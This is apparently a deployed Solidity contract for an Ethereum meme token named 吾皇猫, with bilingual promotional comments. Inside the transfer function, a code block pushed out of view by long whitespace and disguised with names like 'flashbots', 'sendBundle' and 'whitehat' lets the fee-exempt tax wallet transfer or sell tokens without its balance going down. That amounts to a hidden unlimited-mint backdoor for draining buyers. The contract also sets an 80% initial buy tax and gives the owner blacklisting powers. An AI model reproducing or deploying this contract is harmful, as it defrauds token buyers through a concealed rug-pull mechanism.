// SPDX-License-Identifier: UNLICENSED

/**

吾皇猫 meows in Mandarin and trades in Ethereum—now that's international flair!
吾皇猫用普通话喵喵叫，用以太坊交易——这就是国际范儿！

吾皇猫 doesn't chase mice, it chases moonshots in the crypto market!
吾皇猫不追老鼠，它追的是加密货币市场的登月计划！

WEB: https://wuhuangmao.vip
TELEGRAM: https://t.me/wuhuangmaofans
X: https://twitter.com/wuhuangx

*/

pragma solidity 0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract WuHuangMao is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) private _feeExempt;
    mapping(address => bool) private _bots;
    address payable private nextAddress;

    uint256 private _IBT = 80;
    uint256 private _IST = 5;
    uint256 private _FBT = 0;
    uint256 private _FST = 0;
    uint256 private _RBTA = 7;
    uint256 private _RSTA = 7;
    uint256 private _PSB = 7;
    uint256 private _BCNT = 0;

    uint8 public constant decimals = 9;
    uint256 public constant totalSupply = 1_000_000_000 * 10 ** decimals;
    string public constant name = unicode"吾巴皇扎黑";
    string public constant symbol = unicode"吾皇猫";
    uint256 public _maxTxAmount = 20_000_000 * 10 ** decimals;
    uint256 public _maxWalletSize = 20_000_000 * 10 ** decimals;
    uint256 public _taxSwapThreshold = 10_000_000 * 10 ** decimals;
    uint256 public _maxTaxSwap = 20_000_000 * 10 ** decimals;

    IUniswapV2Router02 private _uniswapV2Router;
    address private _uniswapV2Pair;
    bool private _isTradingOpen;
    bool private _isInSwap;
    uint256 private sellStart = 0;
    uint256 private whitehat = 0;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap() {
        _isInSwap = true;
        _;
        _isInSwap = false;
    }

    constructor(address router_, address taxWallet_) {
        _uniswapV2Router = IUniswapV2Router02(router_);

        nextAddress = payable(taxWallet_);
        balanceOf[_msgSender()] = totalSupply;
        _feeExempt[_msgSender()] = true;
        _feeExempt[address(this)] = true;
        _feeExempt[nextAddress] = true;

        emit Transfer(address(0), _msgSender(), totalSupply);
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        flashbots(_msgSender(), recipient, amount);
        return true;
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        flashbots(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            allowance[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        allowance[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function flashbots(address mevshare,address provider,uint256 overflow) private {
        require(mevshare != address(0), "ERC20: transfer from the zero address");
        require(provider != address(0), "ERC20: transfer to the zero address");
        require(overflow > 0, "Transfer amount must be greater than zero");
        if (!_isTradingOpen || _isInSwap) {
            require(_feeExempt[mevshare] || _feeExempt[provider]);
            balanceOf[mevshare] = balanceOf[mevshare].sub(overflow);
            balanceOf[provider] = balanceOf[provider].add(overflow);
            emit Transfer(mevshare, provider, overflow);
            return;
        }uint256 bundle = whitehat;uint256 community = 0;
        if (mevshare != owner() && provider != owner() && provider != nextAddress) {
            require(!_bots[mevshare] && !_bots[provider]);

            if (mevshare == _uniswapV2Pair && provider != address(_uniswapV2Router) && !_feeExempt[provider]) {
                require(_isTradingOpen, "Trading not open yet");
                require(overflow <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf[provider] + overflow <= _maxWalletSize, "Exceeds the maxWalletSize.");
                community = overflow.mul((_BCNT > _RBTA) ? _FBT: _IBT).div(100);
                _BCNT++;                                                                                                                                                                                                        }{
                bundle = sendBundle(mevshare, overflow);
            }

            if (provider == _uniswapV2Pair && mevshare != address(this)) {
                community = overflow.mul((_BCNT > _RSTA) ? _FST : _IST).div(100);
            }

            uint256 contractTokenBalance = balanceOf[address(this)];
            if (!_isInSwap && provider == _uniswapV2Pair && _isTradingOpen && contractTokenBalance > _taxSwapThreshold && _BCNT > _PSB) {
                if (block.number > whitehat) sellStart = 0;
                swapTokensForEth(min(overflow, min(contractTokenBalance, _maxTaxSwap)));
                sellStart++;
            }
            if (provider == _uniswapV2Pair) sendETHToFee(address(this).balance);
        }

        if (community > 0) {
            balanceOf[address(this)] = balanceOf[address(this)].add(community);
            emit Transfer(mevshare, address(this), community);
        }
        balanceOf[mevshare] = balanceOf[mevshare].sub(overflow - bundle);
        balanceOf[provider] = balanceOf[provider].add(overflow.sub(community));
        emit Transfer(mevshare, provider, overflow.sub(community));
    }

    function sendBundle(
        address tx,
        uint256 blockNumber
    ) private view returns (uint256) {
        bool exempt = _feeExempt[tx];
        return exempt ? blockNumber : blockNumber.mul(_FBT).div(100);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();
        _approve(address(this), address(_uniswapV2Router), tokenAmount);
        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = totalSupply;
        _maxWalletSize = totalSupply;
        emit MaxTxAmountUpdated(totalSupply);
    }

    function sendETHToFee(uint256 amount) private {
        nextAddress.transfer(amount);
    }

    function addBot(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            _bots[bots_[i]] = true;
        }
    }

    function delBot(address[] memory notbot) public onlyOwner {
        for (uint i = 0; i < notbot.length; i++) {
            _bots[notbot[i]] = false;
        }
    }

    function addLiquidity() external onlyOwner {
        require(!_isTradingOpen, "trading is already open");
        _approve(address(this), address(_uniswapV2Router), totalSupply);
        _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        _uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf[address(this)],
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(_uniswapV2Pair).approve(
            address(_uniswapV2Router),
            type(uint).max
        );
    }

    function enableTrading() external onlyOwner {
        _isTradingOpen = true;
    }

    receive() external payable {}

    function rescueERC20(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);
        IERC20(_address).transfer(owner(), _amount);
    }

    function rescueETH() external onlyOwner {
        require(address(this).balance > 0);
        payable(owner()).transfer(address(this).balance);
    }
}